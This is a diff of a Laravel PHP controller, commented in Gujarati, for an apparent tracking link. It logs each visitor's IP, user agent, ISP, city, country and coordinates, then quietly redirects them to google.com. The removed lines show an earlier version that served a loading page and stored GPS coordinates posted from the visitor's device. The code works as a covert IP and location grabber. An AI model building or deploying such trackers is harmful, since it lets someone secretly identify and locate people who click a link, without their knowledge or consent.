@@ -4,60 +4,49 @@ namespace App\Http\Controllers;
 
 use Illuminate\Http\Request;
 use Illuminate\Support\Facades\DB;
-use Illuminate\Support\Facades\Http;
 use Stevebauman\Location\Facades\Location;
 
 class TrackController extends Controller
 {
     public function track(Request $request)
     {
-        // ૧. IP મેળવવો
-        $ip = $request->ip();
+        // ૧. સાચો IP મેળવો
+        $ip = $request->header('X-Forwarded-For')
+            ? explode(',', $request->header('X-Forwarded-For'))[0]
+            : $request->ip();
 
-        // ૨. IP-બેઝ લોકેશન (મોટા શહેરનું લોકેશન)
-        $locationData = Location::get($ip);
+        // ૨. સીટી અને કન્ટ્રી માટે લોકેશન ડેટા (IP બેઝ)
+        $locationData = Location::get(trim($ip));
 
-        // ૩. ISP મેળવવા માટે API કોલ (Timeout સાથે)
+        // ૩. ISP મેળવવા માટે API કોલ
         $ispName = 'Unknown';
         try {
-            $response = Http::timeout(3)->get("http://ip-api.com/json/{$ip}?fields=isp");
-            if ($response->successful()) {
-                $ispName = $response->json('isp', 'Unknown');
+            $apiUrl = "http://ip-api.com/json/" . trim($ip) . "?fields=isp";
+            $response = @file_get_contents($apiUrl);
+            $json = json_decode($response);
+            if ($json && isset($json->isp)) {
+                $ispName = $json->isp;
             }
         } catch (\Exception $e) {
             $ispName = 'Unknown';
         }
 
-        // ૪. ડેટાબેઝમાં એન્ટ્રી કરવી અને ID મેળવવો
-        $id = DB::table('clicks')->insertGetId([
-            'ip'         => $ip,
+        // ૪. ડેટાબેઝમાં એન્ટ્રી કરો
+        DB::table('clicks')->insert([
+            'ip'         => trim($ip),
             'device'     => $request->header('User-Agent'),
             'isp'        => $ispName,
-            'city'       => $locationData->cityName ?? 'Unknown',
-            'country'    => $locationData->countryName ?? 'Unknown',
-            'latitude'   => $locationData->latitude ?? null, // IP મુજબનું લેટિટ્યુડ
-            'longitude'  => $locationData->longitude ?? null, // IP મુજબનું લોન્ગીટ્યુડ
+            'city'       => $locationData ? ($locationData->cityName ?? 'Unknown') : 'Unknown',
+            'country'    => $locationData ? ($locationData->countryName ?? 'Unknown') : 'Unknown',
+            'latitude'   => $locationData ? $locationData->latitude : null,
+            'longitude'  => $locationData ? $locationData->longitude : null,
             'clicked_at' => now(),
             'created_at' => now(),
             'updated_at' => now(),
         ]);
 
-        // ૫. સીધું ગૂગલ પર જવાને બદલે loading પેજ બતાવો
-        return view('loading', ['id' => $id]);
-    }
-
-    // GPS ડેટા અપડેટ કરવા માટેની નવી મેથડ
-    public function updateLocation(Request $request)
-    {
-        DB::table('clicks')
-            ->where('id', $request->id)
-            ->update([
-                'latitude' => $request->latitude,
-                'longitude' => $request->longitude,
-                'updated_at' => now(),
-            ]);
-
-        return response()->json(['status' => 'success']);
+        // ૫. સીધું ગૂગલ પર રીડાયરેક્ટ
+        return redirect('https://google.com');
     }
 
     public function dashboard(Request $request)
@@ -74,8 +63,7 @@ class TrackController extends Controller
             });
         }
 
-        // Pagination વાપરવું વધુ સારું છે
-        $data = $query->orderBy('clicked_at', 'desc')->paginate(20);
+        $data = $query->orderBy('clicked_at', 'desc')->get();
         return view('dashboard', compact('data'));
     }
 
@@ -90,4 +78,4 @@ class TrackController extends Controller
         DB::table('clicks')->delete(); 
         return back()->with('success', 'બધો જ ડેટા ડિલીટ થઈ ગયો!');
     }
-}
+} 
